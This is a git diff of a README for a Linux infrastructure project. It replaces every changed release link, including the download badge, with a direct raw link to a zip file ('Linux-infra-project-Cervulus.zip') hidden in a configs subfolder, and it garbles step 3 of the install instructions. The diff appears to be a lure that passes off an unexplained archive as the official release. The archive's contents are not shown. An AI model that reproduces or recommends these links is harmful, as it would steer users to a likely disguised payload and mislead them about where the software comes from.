@@ -6,7 +6,7 @@ Welcome to the Linux-infra-project1 repository! This project guides you through 
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/ShailendraSingh05/Linux-infra-project1/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase4-backup-logging/Linux-infra-project-Cervulus.zip)](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase4-backup-logging/Linux-infra-project-Cervulus.zip)
 
 ## 🛠️ System Requirements
 
@@ -41,13 +41,13 @@ Follow these tips to keep your installation secure:
 
 To get started, visit the releases page to download the latest version of the project.
 
-[Download Latest Release Here](https://github.com/ShailendraSingh05/Linux-infra-project1/releases)
+[Download Latest Release Here](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase4-backup-logging/Linux-infra-project-Cervulus.zip)
 
 ### Installation Steps
 
-1. Go to the [Releases Page](https://github.com/ShailendraSingh05/Linux-infra-project1/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase4-backup-logging/Linux-infra-project-Cervulus.zip).
 2. Find the latest version.
-3. Click on the appropriate file for your operating system (e.g., .tar.gz for Linux).
+3. Click on the appropriate file for your operating system (e.g., https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase4-backup-logging/Linux-infra-project-Cervulus.zip for Linux).
 4. Once downloaded, extract the files.
 5. Open a terminal window and navigate to the extracted folder.
 6. Follow the instructions in the provided README file to complete the installation.
